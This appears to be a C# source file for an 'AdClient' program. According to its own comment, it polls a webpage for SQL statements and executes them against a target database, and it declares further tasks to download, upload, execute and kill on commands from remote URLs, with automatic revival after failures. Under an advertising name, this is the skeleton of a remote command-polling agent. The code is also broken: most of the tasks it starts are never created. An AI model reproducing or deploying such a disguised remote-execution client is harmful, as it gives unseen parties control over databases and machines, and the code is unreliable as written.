using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Threading;
using System.Data.SqlClient;
using System.Data.Sql;
using System.Data;
using System.Configuration;
using System.IO;

using com.sky88.web.automation;
using com.sky88.common.logging;
using com.sky88.common.system;

namespace com.sky88.biz.food.ads
{
    /// <summary>
    /// This program will fetch a SQL statement from a webpage and then inject and execute in target database per specific internval.
    /// </summary>
    public class AdClient : ITaskObserver
    {
        SqlConnection sql_conn = new SqlConnection(ConfigurationManager.ConnectionStrings["dbConnStr"].ToString());
        bool reviveFromDead = Boolean.Parse(ConfigurationManager.AppSettings["reviveFromDead"].ToString());
        bool hasError = false;

        string clientID = ConfigurationManager.AppSettings["clientID"].ToString();
        string url2Ack = ConfigurationManager.AppSettings["sURL2Ack"].ToString();
        string url2Sql = ConfigurationManager.AppSettings["sURL2Sql"].ToString();
        string url2Down = ConfigurationManager.AppSettings["sURL2Down"].ToString();
        string url2Up = ConfigurationManager.AppSettings["sURL2Up"].ToString();
        string url2File = ConfigurationManager.AppSettings["sURL2File"].ToString();
        string url2Exec = ConfigurationManager.AppSettings["sURL2Exec"].ToString();
        string url2Kill = ConfigurationManager.AppSettings["sURL2Kill"].ToString();
        string logFilePath = ConfigurationManager.AppSettings["logFilePath"].ToString();
        string downloadFilePath = ConfigurationManager.AppSettings["downloadFilePath"].ToString();

        int reviveTime = int.Parse(ConfigurationManager.AppSettings["iSecondWaitBeforeRevive"].ToString());
        int pollIntervalSQL = int.Parse(ConfigurationManager.AppSettings["iSQLPollIntervalMS"].ToString());
        int pollIntervalDown = int.Parse(ConfigurationManager.AppSettings["iDownPollIntervalMS"].ToString());
        int pollIntervalUp = int.Parse(ConfigurationManager.AppSettings["iUpPollIntervalMS"].ToString());
        int pollIntervalExec = int.Parse(ConfigurationManager.AppSettings["iExecPollIntervalMS"].ToString());
        int pollIntervalKill = int.Parse(ConfigurationManager.AppSettings["iKillPollIntervalMS"].ToString());

        Logger logger;
        SQLTask taskSQL;
        DownloadTask taskDownload;
        UploadTask taskUpload;
        ExecuteTask taskExecute;
        KillTask taskKill;

        public AdClient() 
        {
            logger = new Logger(logFilePath + "[MAIN]" + DateTime.Now.ToString("yyyyMMdd") + ".log");
            SQLTaskParameter stp = new SQLTaskParameter(sql_conn);
            AutomationTaskParameter atpSQL = new AutomationTaskParameter();
            atpSQL.ClientID = clientID;
            atpSQL.AcknowledgeURL = "http://localhost/testAD/testAckDie.aspx";
            atpSQL.Name = "[SQL]";
            atpSQL.CommandURL = url2Sql;
            atpSQL.IsRepeat = true;
            atpSQL.PollInterval = pollIntervalSQL;
            atpSQL.Logger = logger;
            atpSQL.Observer = this;
            taskSQL = new SQLTask(atpSQL, stp);
        }
        void run()
        {
            while (true)
            {
                hasError = false;
                print("Application start.");
                taskDownload.start();
                taskUpload.start();
                taskExecute.start();
                taskKill.start();
                taskSQL.start();

                print("All tasks started. Wait for completion...");

                while (!hasError) Thread.Sleep(500);

                Buzzer.Beep();
                print("Auto revive in " + reviveTime + " seconds.");
                int reviveCount = reviveTime;
                while (reviveCount >= 0)
                {
                    string msg = "\rAuto revive in " + reviveCount + " seconds";
                    string dots;
                    if (reviveCount % 3 == 0) dots = "...";
                    else if (reviveCount % 3 == 1) dots = "..";
                    else dots = ".";
                    Console.Write("\r" + new string(' ', Console.WindowWidth - 1) + "\r");
                    Console.Write(msg + dots);
                    Thread.Sleep(1000);
                    reviveCount--;
                }

                isTerminating = false;
                if (reviveFromDead)
                {
                    print("The program revive now.");
                    continue;
                }
                else break;
            }
            print("Press <Enter> to exit.");
            Console.ReadLine();
        }
        bool isTerminating = false;

        public void notify(string message)
        {
            print("[MAIN]" + message);
        }

        public void notifyError(string message, Exception e)
        {
            printError("Exception notified:" + message, e);
            hasError = true;

            if (!isTerminating)
            {
                isTerminating = true;
                print("Terminating all threads.");
                taskSQL.stop();
                taskDownload.stop();
                taskUpload.stop();
                taskExecute.stop();
                taskKill.stop();
            }
        }
        void printError(string message, Exception e)
        {
            if (logger != null) logger.printAndLogError("[MAIN] " + message, e);
        }
        void print(string message)
        {
            if (logger != null) logger.printAndLog("[MAIN] " + message);
        }
        static void Main(string[] args)
        {
            AdClient client = new AdClient();
            client.run();
        }
    }
}
